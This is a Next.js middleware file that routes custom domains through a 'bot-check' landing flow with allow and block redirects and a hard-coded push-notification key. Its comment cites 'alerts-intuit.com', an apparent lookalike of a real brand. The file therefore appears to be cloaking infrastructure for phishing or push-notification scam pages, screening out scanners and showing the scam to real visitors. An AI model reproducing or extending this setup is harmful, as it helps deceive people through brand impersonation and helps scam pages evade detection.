import { NextResponse } from 'next/server'

export async function middleware(request) {
  const hostname = request.headers.get('host')
  const url = request.nextUrl.clone()
  
  // Skip middleware for localhost, ngrok, and Vercel preview deployments
  if (hostname.includes('localhost') || 
      hostname.includes('ngrok') || 
      hostname.includes('127.0.0.1') ||
      hostname.includes('vercel.app') ||
      hostname.includes('vercel.sh')) {
    return NextResponse.next()
  }
  
  // Skip middleware for API routes and static files
  if (url.pathname.startsWith('/api') || 
      url.pathname.startsWith('/_next') ||
      url.pathname.startsWith('/static') ||
      url.pathname.includes('.')) {
    return NextResponse.next()
  }
  
  // For custom domains, redirect to landing page flow
  // This handles domains like alerts-intuit.com pointing to your app
  if (!url.pathname.startsWith('/landing/bot-check')) {
    // Look up landing page by domain
    const landingResponse = await fetch(`${url.origin}/api/landing/by-domain?domain=${hostname}`)
    
    if (landingResponse.ok) {
      const landing = await landingResponse.json()
      
      // Redirect to bot check with landing configuration
      const botCheckUrl = new URL('/landing/bot-check', url.origin)
      botCheckUrl.searchParams.set('landingId', landing.landingId)
      botCheckUrl.searchParams.set('domain', hostname)
      botCheckUrl.searchParams.set('url', `https://${hostname}`)
      botCheckUrl.searchParams.set('allowRedirect', landing.allowRedirectUrl || `https://${hostname}/thank-you`)
      botCheckUrl.searchParams.set('blockRedirect', landing.blockRedirectUrl || `https://${hostname}/blocked`)
      botCheckUrl.searchParams.set('vapidKey', process.env.NEXT_PUBLIC_VAPID_PUBLIC_KEY || 'BGv2Vm45eFGslcXFhakD-euIXAnOg6-bdqVWHoSw4gwvjvYYV1zBA_Q7uiNij5yvRqMwmDhpBYYSA1v5Z_GEv_k')
      
      return NextResponse.redirect(botCheckUrl)
    }
  }
  
  return NextResponse.next()
}

export const config = {
  matcher: '/((?!api|_next/static|_next/image|favicon.ico).*)',
}